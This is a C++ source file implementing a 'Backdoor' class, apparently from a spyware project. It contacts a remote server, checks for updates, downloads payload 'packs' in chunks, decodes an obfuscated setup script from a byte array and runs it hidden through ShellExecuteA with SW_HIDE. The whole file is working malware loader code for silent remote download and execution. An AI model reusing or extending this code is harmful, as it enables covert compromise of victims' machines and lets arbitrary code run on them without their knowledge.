#include "backdoor.h"
#include "../proc.h"

extern PATH_COMBINE path_combine;

bool Backdoor::check_update_avaiable(const Version * version) const
{
	send_header(SPY_BDR_HEADER_CHK_UPDATE, 3);
	send_content((const byte *)version, 0, 3);
	return receive_flag() == SPY_BDR_FLAG_YES;
}

bool Backdoor::dwnl_pack(byte id, char * file_path)
{
	// send request download pack first
	send_header(SPY_BDR_HEADER_DWN_PACK, 1);// just id[1]
	send_content(&id, 0, 1);
	// downlad pack
	return dwnl_file(file_path);
}

bool Backdoor::dwnl_file(char * file_path) const
{
	char file_name[25];
	int file_size;
	byte content_type;
	int content_length;
	// receive file header includes file name and file size
	for (int i = 0; i < 2; i++)
	{
		receive_header(&content_type, &content_length);
		if (content_type == SPY_BDR_HEADER_DT_FILENAME)
		{
			receive_content((byte *)file_name, 0, content_length);
			file_name[content_length] = '\0';
		}
		else if (content_type == SPY_BDR_HEADER_DT_FILESIZE)
		{
			receive_content((byte *)&file_size, 0, 4);
		}
	}
	// check valid data then receive main file data
	if (strlen(file_name) > 0 && file_size > 0)
	{
		path_combine(file_path, working_dir, file_name);
		FILE * fout = fopen(file_path, "w+b");
		if (fout == NULL)
			throw errno;
		LOG_I("Prepare receive pack '%s' with %d bytes...", file_name, file_size);
		int total_received_bytes = 0;
		byte * buffer = new byte[SPY_IO_IN_SZBUFFER];
		__try 
		{
			do
			{
				int length;
				// receive file chunk size
				receive_header(buffer, &length);
				if (buffer[0] != SPY_BDR_HEADER_DT_FILECHUNK)
					throw 1;
				// receive file data package
				receive_nbytes(buffer, 0, length);
				// then write to temp file in disk
				fwrite(buffer, 1, length, fout);
				total_received_bytes += length;
				// response to server to notify the next file data package
				send_flag(SPY_BDR_FLAG_YES);
				LOG_I("Download %d bytes", length);
			} while (total_received_bytes < file_size);
		}
		__finally
		{
			fclose(fout);
			delete[] buffer;
		}
		LOG_I("Downloaded pack!");
		return true;
	}
	return false;
}

void Backdoor::install_pack(const char * file_path) const
{
	char * args = new char[MAX_PATH];
	strcpy(args, "\"");
	strcat(args, file_path);
	strcat(args, "\"");
	export_setup_script();
	HINSTANCE hinst = ShellExecuteA(NULL, "open", script_file_path, args, root_dir, SW_HIDE);
	if ((int)hinst <= 32)
		DeleteFileA(file_path);
	delete[] args;
}

bool Backdoor::export_setup_script() const
{
	FILE * file = fopen(script_file_path, "w+b");
	if (file == NULL)
		return false;
	byte script[] = SPY_BDR_SETUP_PACK_SCRIPT;
	int bytes = sizeof(script);
	for (int i = 0; i < bytes; i++)
	{
		byte ch = script[i] - (i % 2 == 0 ? 12 : 25);
		fwrite(&ch, 1, 1, file);
	}	
	fclose(file);
	return true;
}

void Backdoor::create_working_dir_if_necessary() const
{
	DWORD attr = GetFileAttributesA(working_dir);
	if (attr == INVALID_FILE_ATTRIBUTES || attr & FILE_ATTRIBUTE_DIRECTORY)
	{
		LOG_D("Working directory is not exist! Creating...");
		CreateDirectoryA(working_dir, NULL);
	}
}

bool Backdoor::check_and_dwnl_update()
{
	Version version;
	version.major = SPY_MAJOR_VERSION;
	version.minor = SPY_MINOR_VERSION;
	version.revision = SPY_REVISION;
	bool available = check_update_avaiable(&version);
	if (available)
	{
		if (upd_pck_path != NULL)
			delete[] upd_pck_path;
		upd_pck_path = new char[MAX_PATH];
		return dwnl_pack(0, upd_pck_path);
	}
	return false;
}

void Backdoor::install_update_pack()
{
	install_pack(upd_pck_path);
}

Backdoor::Backdoor(const char * server_addr, int server_port, const char * working_dir, const char * root_dir)
	:Comm(server_addr, server_port)
{
	this->working_dir = strdup(working_dir);
	this->root_dir = strdup(root_dir);
	this->script_file_path = new char[MAX_PATH];
	path_combine(script_file_path, working_dir, SPY_BDR_SETUP_PACK_SCRIPT_NAME);
	create_working_dir_if_necessary();
}

Backdoor::~Backdoor()
{
	delete[] script_file_path;
	delete[] working_dir;
	delete[] root_dir;
	if (upd_pck_path != NULL)
		delete[] upd_pck_path;
}